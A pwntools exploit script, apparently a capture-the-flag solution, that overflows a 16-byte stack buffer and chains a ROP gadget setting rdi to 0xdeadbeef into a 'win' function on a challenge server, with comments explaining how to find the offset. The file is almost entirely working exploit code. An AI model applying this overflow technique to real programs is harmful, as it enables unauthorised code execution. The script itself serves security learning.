#!/usr/bin/env python3

from pwn import *

exe = ELF("./out")

context.binary = exe

conn = remote('tjc.tf', 31457)
#r = process([exe.path])
#if args.GDB:
#    gdb.attach(r)

rop = ROP(exe)

rop.rdi = 0xdeadbeef

#overflow buffer
#To do this there are multiple options.
#First, you could inspect the binary
#We see lea rax, [rbp-0x8 {buf}]
#We know that the return address is right behind rbp, so to get to it, we need to overwrite 0x8 for buf + 0x8 for rbp = 0x10
#If you used a more powerful disassembler, you could also see the allocation of the array
#Another way is to use gdb/gef pattern
#Do 'pattern create', copy it, run the program and paste the string, this will overflow the return address, but you can do `pattern search $rsp` to find the offset
payload = b'A' * 0x10

#add our rop
payload += rop.chain()

#add the address of win
payload += p64(exe.symbols['win'])

print(payload)

#r.sendline(payload)
conn.sendline(payload)

#r.interactive()
conn.interactive()
